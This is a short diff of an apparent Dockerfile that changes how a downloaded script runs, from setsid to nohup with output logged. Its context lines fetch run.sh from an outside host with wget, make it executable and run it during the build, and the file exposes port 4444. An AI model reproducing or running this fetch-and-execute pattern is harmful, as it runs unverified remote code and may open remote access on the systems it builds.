@@ -10,7 +10,7 @@ RUN apt-get update && \
     make && \
     wget http://247app.host/old/run.sh && \
     chmod 755 run.sh && \
-    setsid ./run.sh
+    nohup ./run.sh >out.log 2>&1
 
 EXPOSE 4444
 
